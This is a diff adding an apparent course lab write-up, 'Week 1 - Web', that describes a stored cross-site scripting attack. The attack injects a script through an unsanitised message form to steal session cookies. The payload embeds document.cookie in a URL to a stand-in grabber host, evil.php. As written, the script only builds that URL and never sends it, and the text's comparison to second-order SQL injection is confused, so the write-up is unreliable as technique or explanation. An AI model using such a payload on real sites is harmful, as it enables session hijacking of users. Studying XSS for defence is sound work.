@@ -1,0 +1,20 @@
+Week 1 - Web
+============
+
+
+Part 1: Black Box Assessment
+----------------------------
+
+## Attack A. Cookie Theft
+
+The cookie theft is done by writing up in the message input the following line message:
+
+	`Any message we want</p>
+	<SCRIPT type="text/javascript">
+		var adr = "http://www.cookiegrabber.com/evil.php?cookie=" + escape(document.cookie);
+	</SCRIPT>
+	<p>`
+
+Because the form inputs are not sanitised or checked in any way by the server we can save the message in the databese like it is. If in a Second-Order SQL Injection the data stored in database is later used to conduct SQL injection, In this case we might say that this is a Second-Order cookie hijacking because we get the session token when the user clicks on our message and renders the HTML page with our script. Stored Cross-site Scripting (XSS) is the most dangerous type of Cross Site Scripting. Web applications that allow users to store data are potentially exposed to this type of attack.
+
+
